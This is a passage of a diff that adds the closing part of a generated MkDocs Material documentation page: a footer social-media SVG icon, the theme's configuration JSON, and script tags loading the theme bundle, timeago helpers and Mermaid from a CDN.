+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.indexes", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../js/timeago.min.js"></script>
+      
+        <script src="../../../../js/timeago_mkdocs_material.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+      
+    
+  </body>
+</html>
